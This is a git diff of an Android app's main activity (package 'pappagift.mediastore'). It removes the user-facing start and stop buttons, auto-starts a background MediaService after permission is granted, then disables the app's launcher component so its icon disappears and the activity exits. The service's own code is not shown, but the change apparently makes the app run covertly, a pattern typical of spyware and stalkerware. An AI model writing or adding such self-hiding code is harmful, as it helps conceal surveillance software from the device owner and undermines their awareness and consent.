@@ -27,28 +27,17 @@ import com.example.pappagift.mediastore.Utility.MediaUtility;
 
 import java.io.IOException;
 
-public class MainActivity extends AppCompatActivity implements View.OnClickListener {
+public class MainActivity extends AppCompatActivity {
     public static final String TAG = "MediaStore";
     private static final int REQ_CODE_ASK_PERMS = 401;
     private Intent serviceIntent;
-    private ImageView img1, img2;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        Button btnStartService, btnStopService;
-        btnStartService = (Button) findViewById(R.id.btnStartService);
-        btnStopService = (Button) findViewById(R.id.btnStopService);
-
-        img1 = (ImageView) findViewById(R.id.img1);
-        img2 = (ImageView) findViewById(R.id.img2);
-
         serviceIntent = new Intent(this, MediaService.class);
-
-        btnStartService.setOnClickListener(this);
-        btnStopService.setOnClickListener(this);
 
         if(new MediaUtility(this).isFirstInstall()) {
             initConfig();
@@ -82,8 +71,22 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 }, 100);
                 return;
             }
-            //Todo
         }
+        startService();
+    }
+
+    private void startService() {
+        startService(serviceIntent);
+        hideLauncher();
+    }
+
+    private void hideLauncher() {
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+        this.finish();
+        System.exit(0);
     }
 
     @Override
@@ -91,7 +94,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         switch (requestCode) {
             case REQ_CODE_ASK_PERMS:
                 if(grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    //Todo
+                    startService();
                 }else {
                     Toast.makeText(this, "Please provide permission", Toast.LENGTH_SHORT).show();
                 }
@@ -99,24 +102,6 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
             default:
                 super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        }
-    }
-
-    @Override
-    public void onClick(View v) {
-        switch (v.getId()) {
-            case R.id.btnStartService:
-                Log.d(TAG, "On Start");
-                startService(serviceIntent);
-                break;
-
-            case R.id.btnStopService:
-                Log.d(TAG, "On Stop");
-                stopService(serviceIntent);
-                break;
-
-            default:
-                break;
         }
     }
 }
